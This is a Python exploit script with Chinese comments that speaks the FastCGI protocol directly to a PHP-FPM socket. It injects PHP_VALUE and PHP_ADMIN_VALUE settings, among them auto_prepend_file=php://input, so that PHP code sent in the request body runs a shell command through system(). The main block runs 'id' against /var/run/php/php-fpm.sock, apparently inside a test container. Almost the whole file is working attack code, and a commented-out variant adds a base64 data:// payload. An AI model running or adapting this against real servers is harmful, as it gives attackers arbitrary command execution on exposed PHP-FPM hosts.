import socket
import struct

# FastCGI 常量定义
FCGI_BEGIN_REQUEST = 1
FCGI_PARAMS = 4
FCGI_STDIN = 5
FCGI_RESPONDER = 1

def fcgi_header(type, request_id, content_len, padding_len):
    """构造 8 字节的 FastCGI 头部"""
    return struct.pack("!BBHHBB", 1, type, request_id, content_len, padding_len, 0)

def fcgi_kv(name, value):
    """构造键值对负载 (Name-Value Pair)"""
    nlen = len(name)
    vlen = len(value)
    if nlen < 128:
        nlen = struct.pack("B", nlen)
    else:
        nlen = struct.pack("!I", nlen | 0x80000000)
    if vlen < 128:
        vlen = struct.pack("B", vlen)
    else:
        vlen = struct.pack("!I", vlen | 0x80000000)
    return nlen + vlen + name.encode() + value.encode()

def exploit(sock_path, script_path, command):
    # 1. 构造 BEGIN_REQUEST
    begin_body = struct.pack("!HB5B", FCGI_RESPONDER, 1, 0, 0, 0, 0, 0)
    begin_record = fcgi_header(FCGI_BEGIN_REQUEST, 1, len(begin_body), 0) + begin_body

    # 方法1：使用 php://input 但确保正确闭合
    php_code = f"<?php system('{command}'); exit; ?>"
    
    # 方法2（更可靠）：使用 php://filter 来包含
    # php_code = f"php://filter/convert.base64-decode/resource=data://text/plain;base64,{base64.b64encode(f'<?php system(\"{command}\"); ?>'.encode()).decode()}"
    
    params_dict = {
        'SCRIPT_FILENAME': script_path,
        'DOCUMENT_ROOT': '/var/www/html',
        'REQUEST_METHOD': 'POST',
        'PHP_VALUE': 'auto_prepend_file = php://input',
        'PHP_ADMIN_VALUE': 'allow_url_include = On\nopen_basedir = /',
        'CONTENT_LENGTH': str(len(php_code)),
        'CONTENT_TYPE': 'application/x-www-form-urlencoded'
    }
    
    params_body = b""
    for k, v in params_dict.items():
        params_body += fcgi_kv(k, v)
    
    params_record = fcgi_header(FCGI_PARAMS, 1, len(params_body), 0) + params_body
    params_empty = fcgi_header(FCGI_PARAMS, 1, 0, 0)

    # STDIN 内容
    stdin_body = php_code.encode()
    stdin_record = fcgi_header(FCGI_STDIN, 1, len(stdin_body), 0) + stdin_body
    stdin_empty = fcgi_header(FCGI_STDIN, 1, 0, 0)

    # 发送 Payload
    payload = begin_record + params_record + params_empty + stdin_record + stdin_empty

    try:
        client = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        client.connect(sock_path)
        client.sendall(payload)
        
        # 接收更多响应数据
        response = b""
        client.settimeout(2)
        while True:
            try:
                chunk = client.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
                
        print("--- 响应结果 ---")
        print(response.decode(errors='ignore'))
    finally:
        client.close()

# 测试
if __name__ == "__main__":
    # 确保容器中有这个文件
    exploit('/var/run/php/php-fpm.sock', '/var/www/html/index.php', 'id')